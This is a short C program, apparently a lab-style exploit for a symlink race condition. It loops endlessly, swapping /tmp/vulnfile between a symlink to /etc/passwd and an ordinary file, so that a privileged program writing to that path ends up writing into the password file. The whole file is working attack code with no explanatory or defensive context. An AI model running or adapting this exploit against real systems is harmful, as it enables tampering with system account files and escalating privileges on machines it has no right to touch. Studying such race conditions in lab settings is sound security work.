#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main() {
    while (1) {
        unlink("/tmp/vulnfile");
        symlink("/etc/passwd", "/tmp/vulnfile");
        usleep(100); // brief delay to increase race success
        unlink("/tmp/vulnfile");
        FILE* f = fopen("/tmp/vulnfile", "w");
        if (f) {
            fprintf(f, "Temporary file\n");
            fclose(f);
        }
    }
    return 0;
}